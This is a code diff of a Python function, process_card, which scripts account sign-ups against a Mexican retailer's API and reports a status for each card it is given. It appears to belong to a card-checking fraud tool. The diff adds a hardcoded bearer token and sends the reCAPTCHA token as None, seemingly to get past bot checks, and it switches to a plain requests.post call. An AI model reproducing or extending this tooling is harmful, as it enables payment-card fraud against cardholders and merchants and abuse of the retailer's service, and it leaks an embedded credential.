@@ -177,6 +177,7 @@ async def process_card(card: str) -> str:
                 'authority': 'ultravision.api.koonolmexico.com',
                 'accept': 'application/json, text/javascript, */*; q=0.01',
                 'accept-language': 'es-ES,es;q=0.9',
+                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI3NDVlOTk5ZS1lNWY4LTQxMmMtYTNhYS1jNzZkMzZmNmEwMjAifQ.hbskLok4zoK-KUN64liDaNoWyEHx1eCMokI67UIWifc',
                 'cache-control': 'no-cache',
                 'content-type': 'application/json; charset=UTF-8',
                 'origin': 'https://tienda.ultracel.com.mx',
@@ -200,11 +201,12 @@ async def process_card(card: str) -> str:
                     'email': correo_seleccionado,
                     'phone': None,
                     'mobile_phone': '9971556986',
+                    'google_recaptcha_token': None,
                     'privacy_acceptance': True,
                 },
             }
 
-            response = c.post('https://ultravision.api.koonolmexico.com/users', headers=headers, json=json_data)
+            response = requests.post('https://ultravision.api.koonolmexico.com/users', headers=headers, json=json_data)
             responsePm = json.loads(response.text)
             id_servicio = responsePm['user']['id']
             print(id_servicio)
@@ -440,6 +442,7 @@ async def process_card(card: str) -> str:
     else:
 
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
+
 
 
 
